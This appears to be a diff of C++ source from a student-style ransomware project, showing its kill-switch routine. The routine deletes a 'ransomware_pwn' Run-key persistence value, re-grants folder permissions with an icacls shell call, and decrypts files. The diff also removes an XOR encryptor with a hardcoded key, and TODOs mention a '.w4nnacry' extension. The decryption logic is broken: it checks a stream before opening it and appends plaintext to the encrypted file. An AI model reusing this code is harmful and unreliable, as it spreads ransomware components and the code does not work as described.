@@ -1,42 +1,79 @@
 #include "kill_switch.h"
+#include "cipher.h"
 
 vector<wstring> decrypt_files(wstring path)
 {
-	vector<wstring> subdirs, matches;
-
 	// kill persistence value
 	HKEY hKey;
-	LONG oresult = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, KEY_ALL_ACCESS, &hKey);
+	LONG oresult = RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, KEY_ALL_ACCESS, &hKey);
 	if (oresult == ERROR_SUCCESS)
 	{
-		RegDeleteValue(hKey, "ransomware_pwn");
+		RegDeleteValue(hKey, L"ransomware_pwn");
 		RegCloseKey(hKey);
 	}
 	else {
 		std::cout << "RegDelete Error: " << GetLastError() << std::endl;
 	}
 
+	// Restore user privileges for files
 	GetPrivsnDelete();
 
-	// TODO: finish the decrypting of files
+	// Enumerate through directory and decrypt line by line, file by file.
+	vector<wstring> subdirs, matches;
+	WIN32_FIND_DATA ffd;
+	HANDLE hFind = FindFirstFile((_T(path) + L"\\*.*").c_str(), &ffd);
+
+	if (hFind != INVALID_HANDLE_VALUE)
+	{
+		do {
+			wstring filename = _T(ffd.cFileName);
+			if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
+			{
+				wstring file_path = path + L"\\" + filename;
+				matches.push_back(file_path);
+
+				std::wcout << "Decrypting file: " << filename << std::endl;
+
+				// open file for writing
+				std::ofstream outfile;
+				if (outfile.fail())
+				{
+					std::wcout << "Can't open file " << filename << "!" << std::endl;
+				}
+				else {
+					string readout;
+					string decrypted_text;
+
+					// for read
+					ifstream file_read(file_path);
+					// for write
+					outfile.open(file_path, std::ios::in | ::ios::out | std::ios::app);
+					while (getline(file_read, readout))
+					{
+						// Decrypt each word
+						string key = generateKey(readout, keyword);
+						decrypted_text = decryptText(readout, key);
+						std::cout << "Decrypted Text: " << decrypted_text << std::endl;
+						// append replaced strings to file
+						outfile << decrypted_text + "\n";
+						decrypted_text.clear();
+					}
+
+					// close files
+					file_read.close();
+					outfile.close();
+				}
+			}
+		} while (FindNextFile(hFind, &ffd) != 0);
+	}
+	else {
+		std::cout << "Can't find files in directory" << std::endl;
+	}
+	FindClose(hFind);
+
 	// TODO: Replace file extensions to a signature .txt->.w4nnacry
 	// TODO: Delete persistance file created
 	return matches;
-}
-
-// XOR encryptor, decryptor
-string encryptDecrypt(string toEncrypt)
-{
-	char key[10] = { 'A', '2', 'G', '6', 'J', 'L', 'C', 'C', 'Q', 'P' };
-	string output = toEncrypt;
-	int k_size = (sizeof(key) / sizeof(char));
-
-	for (int i = 0; i < toEncrypt.size(); i++)
-	{
-		output[i] = toEncrypt[i] ^ key[i % k_size];
-	}
-
-	return output;
 }
 
 BOOL SetPrivilege(HANDLE hToken, LPCTSTR Privilege, BOOL bEnablePrivilege)
@@ -106,8 +143,8 @@ void GetPrivsnDelete()
 		// grant privs back to whole folders
 		ShellExecute(NULL,
 			NULL,
-			"cmd",
-			"/k icacls ..\\..\\test_attack_folder\\* /grant \"everyone\":(IO)(CI)M",
+			L"cmd",
+			L"/k icacls ..\\..\\test_attack_folder\\* /grant \"everyone\":(IO)(CI)M",
 			0,
 			SW_NORMAL
 		);
